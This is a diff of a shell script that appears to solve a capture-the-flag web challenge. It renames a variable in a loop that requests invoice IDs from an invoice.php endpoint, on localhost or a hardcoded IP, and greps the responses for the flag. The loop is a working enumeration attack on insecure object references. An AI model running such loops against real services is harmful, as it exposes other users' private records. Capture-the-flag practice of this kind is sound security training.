@@ -3,22 +3,22 @@ PORT=8085
 
 if [[ $1 == "local" ]]
 then
-    remote='http://127.0.0.1:'$PORT
+    url='http://127.0.0.1:'$PORT
 elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
 then
-    remote='http://141.85.224.115:'$PORT
+    url='http://141.85.224.115:'$PORT
 else
-    remote=$1':'$2
+    url=$1':'$2
 fi
 
 # Mind your own business
 echo "Start exploit for Mind your own business"
-remote=$remote'/invoice.php?invoice='
+url=$url'/invoice.php?invoice='
 fibb_1=1
 fibb_2=1
 while [ $fibb_2 -le 50000 ]
 do
-    flag=$(curl -s $remote$fibb_2 | grep -o "SSS{.*}")
+    flag=$(curl -s $url$fibb_2 | grep -o "SSS{.*}")
     if [[ ! -z $flag ]]; then 
         break
     fi
